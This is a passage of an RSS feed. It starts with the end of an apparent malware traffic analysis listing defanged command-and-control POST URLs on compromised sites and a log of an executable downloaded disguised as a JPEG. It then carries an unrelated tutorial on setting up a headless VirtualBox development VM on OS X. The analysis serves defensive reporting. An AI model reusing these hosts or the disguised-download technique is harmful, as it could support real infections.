POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?p=qovvtc388iq4bm
POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?y=4l425ka9qjn
Server IP: 94.102.1.207

POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?x=cg1odjtnay
POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?u=t1dfbt93fg
POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?p=4l425ka9qjn
Server IP: 95.85.4.87
</code></pre>

<h6 id="five2jpg211954869exeanalysis">five2.jpg/211954869.exe Analysis</h6>

<pre><code># Payload Download: Response
* Connected to 31072015a[.]com (107.15.99.91) port 80 (#0)
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Host: 31072015a[.]com
Accept: */*
HTTP/1.1 200 OK

Server: Apache/2.2.15 (CentOS)
Last-Modified: Wed, 05 Aug 2015 21:30:02 GMT
ETag: "c100037-3a600-51c971b00f877"
Accept-Ranges: bytes
Content-Length: 239104
Connection: close
Content-Type: image/jpeg

# Network Traffic
Post-Infection Requests:
POST hxxp://prestigecarstorage.com[.]au:80/wp-includes/Text/Text.php
Server IP: 192.186.240.131

POST hxxp://mcmamina[.]cz:80/media/plg_quickicon_joomlaupdate/plg_quickicon_joomlaupdate.php
Server IP: 82.208.47.134

POST hxxp://buyseoplan[.]com:80/wp-admin/includes/includes.php
Server IP: 160.153.34.130

POST hxxp://letssaidiana[.]com:80/wp-admin/user/user.php
Server IP: 50.62.121.1

POST hxxp://kenyadivas[.]com:80/media/editors/editors.php
Server IP: 192.254.185.141

POST hxxp://keithgerchak[.]com:80/wp-admin/css/css.php
Server IP: 50.63.93.1

POST hxxp://binarycashbackdaily[.]com:80/wp-admin/maint/maint.php
Server IP: 198.15.118.164

POST hxxp://apexsitesolutions[.]com:80/main/wp-admin/mod_html.php
Server IP: 184.168.179.1

POST hxxp://employerservice[.]net:80/wp-includes/theme-compat/theme-compat.php
Server IP: 23.229.242.167

POST hxxp://hmb.com[.]au:80/wp-admin/images/images.php
Server IP: 192.186.203.132

POST hxxp://denver-computer-repairs[.]com:80/wordpress2/wp-includes/fckeditor.php
Server IP: 173.201.146.180

POST hxxp://hatmandoo.co[.]uk:80/cache/mod_menu/mod_menu.php
Server IP: 192.254.235.245

POST hxxp://wizjafotografii[.]pl:80/wp-content/languages/languages.php
Server IP: 46.16.186.66
</code></pre>]]></content:encoded></item><item><title><![CDATA[Setting Up A Separate Development Environment in OS X]]></title><description><![CDATA[<p>I like to keep my development environment separate from my host environment on my personal laptop. A simple solution for keeping them apart is to set up a headless virtual machine with a samba share. I like this method the most because you can set up a lightweight server that</p>]]></description><link>https://stefanscherer.github.io/setting-up-a-separate-development-environment-in-os-x/</link><guid isPermaLink="false">28cd8abf-7163-4b1b-b083-f26d971cd3d2</guid><category><![CDATA[development]]></category><category><![CDATA[os x tips]]></category><category><![CDATA[virtualbox]]></category><dc:creator><![CDATA[Pasquale D'Agostino]]></dc:creator><pubDate>Sat, 14 Feb 2015 07:30:00 GMT</pubDate><media:content url="https://stefanscherer.github.io/content/images/2017/01/virtualbox.png" medium="image"/><content:encoded><![CDATA[<img src="https://stefanscherer.github.io/content/images/2017/01/virtualbox.png" alt="Setting Up A Separate Development Environment in OS X"><p>I like to keep my development environment separate from my host environment on my personal laptop. A simple solution for keeping them apart is to set up a headless virtual machine with a samba share. I like this method the most because you can set up a lightweight server that can easily load your code base into your favorite IDE or text editor. I will be using VirtualBox in this example but you can use Fusion as well, it just requires a different command.</p>

<!--more-->

<h4 id="prerequisites">Prerequisites</h4>

<ol>
<li>Download VirtualBox from <a href="https://www.virtualbox.org/wiki/Downloads">here</a></li>
<li>Download Ubuntu Server (14.04 LTS in this example) from <a href="http://www.ubuntu.com/download/server">here</a></li>
</ol>

<p>First, I am going to setup my dotfiles to include a few aliases for interacting with the virtual machine. In your shell configuration file (zsh here) add the equivalent aliases so you can quickly start, mount, and remote into the server. Remember to replace $USER with whatever uid name you will be using on the guest server. Also $GUEST needs to be changed to whatever you call the virtual machine.</p>

<pre><code class="language- bash .zshrc"># Ubuntu devbox aliases
alias devbox='VBoxManage startvm "$GUEST" --type headless'  
alias sshdev='ssh devbox'  
alias mountdev='mount_smbfs //devbox/$USER ~/devbox'  
alias umountdev='umount ~/devbox'  
</code></pre>

<p>After you have VirtualBox installed go ahead and create a new Virtual Machine. I carved off 2048 MB in RAM and 20 GB in storage for the development box. You should now have a basic virtual machine, but before you can boot it up we need to take care of a few things. First, create a Host-Only network that we will later attach as the second adapter (VirtualBox -> Preferences -> Network -> Host-only Networks). If "vboxnet0" is not already there, click the add button and then edit. Configuration listed below.</p>

<pre><code># Adapter
IPv4 Address: 10.10.1.1
IPv4 Network Mask: 255.255.255.248
IPv6 Address:
IPv6 Network Mask Length: 0
</code></pre>

<hr>

<pre><code># DHCP Server
Uncheck Enable Server
</code></pre>

<p>Close out of VirtualBox's settings and highlight the virtual machine we created. We need to attach the ISO we downloaded earlier to the IDE Controller (Settings -> Storage). Once you have added the ISO to empty IDE slot we are going to switch to the Networking tab to setup our interfaces. The first adapter should be set to NAT. If it is not selected go to the drop down for "Attached to:" and add it. Flip into the second adapter and set it to be Host-only. We are done configuring the virtual machine, go ahead and boot the server and follow the basic install instructions. With Ubuntu, you can choose to install Samba and Open SSH Server during the installation process so that kills two birds with one stone for us.</p>

<p>Once the installation is complete and the server reboots, we need to modify two files on the system. The first file I have listed below is your interfaces file. The first adapter "eth0" will be your NAT so the host can communicate outbound to receive packages. Leave this interface configured for DHCP. The second adapter "eth1" is on our Host-Only network and needs a static address. This network allows the host system to connect to any of the public facing services on the headless virtual machine (SSH, Web Server, MongoDB, etc). </p>

<pre><code class="language- bash /etc/network/interfaces"># This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo  
iface lo inet loopback

# The primary network interface
auto eth0  
iface eth0 inet dhcp

# Host-only interface
auto eth1  
iface eth1 inet static  
    address     10.10.1.2
    netmask     255.255.255.248
    network     10.10.1.0
    broadcast   10.10.1.7
</code></pre>

<p>The second file is our samba share configuration that will let you mount the home directory of the guest user. This is where you will store your code base and anything else related to the application. Once you mount it on your host system you can open the project up in your favorite IDE or text editor and begin working. Just remember to save often and unmount the share before shutting down the virtual machine.</p>

<pre><code class="language- bash /etc/samba/smb.conf">[dev]
    comment = $USER
    path = /home/$USER
    guest ok = no
    browseable = no
    writeable = yes
    create mask = 0600
    directory mask = 0700
</code></pre>

<p>On your OS X system, edit your hosts file to include an entry for your virtual machine. This way you can address it by a friendly host name rather than an IP address.</p>

<pre><code class="language- bash /etc/hosts">127.0.0.1   localhost  
255.255.255.255 broadcasthost  
::1             localhost
fe80::1%lo0 localhost

# VirtualBox Hosts
10.10.1.2       devbox  
</code></pre>

<p>That's it! Now you can easily start, mount, and control your virtual machine all from your host system. Just enter "devbox" or whatever alias you changed it to and the virtual machine will boot up in headless mode.</p>]]></content:encoded></item></channel></rss>
